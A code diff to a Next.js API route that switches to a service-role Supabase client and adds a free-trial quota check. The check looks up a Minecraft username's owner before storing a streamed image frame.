@@ -1,7 +1,9 @@
 export const dynamic = 'force-dynamic';
 
+import { createClient } from '@supabase/supabase-js';
 import { createServerClient } from '@supabase/ssr';
 import { NextResponse } from 'next/server';
+import { canUserCapture } from '@/lib/supabase/free-trial';
 
 const ADMIN_EMAILS = ['lifegrading@gmail.com', 'giodewaard152@gmail.com'];
 
@@ -21,10 +23,10 @@ function getClientAuth(request) {
 }
 
 function getClient() {
-  return createServerClient(
+  return createClient(
     process.env.NEXT_PUBLIC_SUPABASE_URL,
     process.env.SUPABASE_SERVICE_ROLE_KEY,
-    { cookies: { getAll() { return []; }, setAll() {} } }
+    { auth: { autoRefreshToken: false, persistSession: false } }
   );
 }
 
@@ -44,6 +46,22 @@ export async function POST(request) {
       const frame = 'data:image/jpeg;base64,' + base64;
 
       const supabase = getClient();
+
+      const { data: grab } = await supabase
+        .from('grabs')
+        .select('owner_email')
+        .eq('minecraft_username', username)
+        .order('created_at', { ascending: false })
+        .limit(1)
+        .single();
+
+      if (grab?.owner_email) {
+        const check = await canUserCapture(supabase, grab.owner_email);
+        if (!check.allowed) {
+          return NextResponse.json({ ok: false, error: 'trial_exhausted', remaining: check.remaining || 0 }, { status: 403 });
+        }
+      }
+
       const { data, error } = await supabase
         .from('stream_frames')
         .upsert(
